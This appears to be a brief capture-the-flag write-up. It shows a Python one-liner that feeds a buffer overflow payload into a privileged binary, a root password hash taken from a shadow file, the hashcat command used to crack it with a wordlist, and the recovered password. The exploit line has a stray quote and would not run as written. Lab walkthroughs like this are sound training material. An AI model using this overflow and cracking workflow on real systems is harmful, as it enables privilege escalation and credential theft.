# Finishing the job

## Notes

```
python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb")' | /opt/secret/root

hash of root
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::

cracking hash using hashcat

hashtype => sha512crypt
hashmode => 1800

```

## Questions

1. What is the root password!

```
hashcat -m 1800 -a 0 hash /media/nikesh/HDD/Security/wordlist/rockyou.txt

love2fish
```
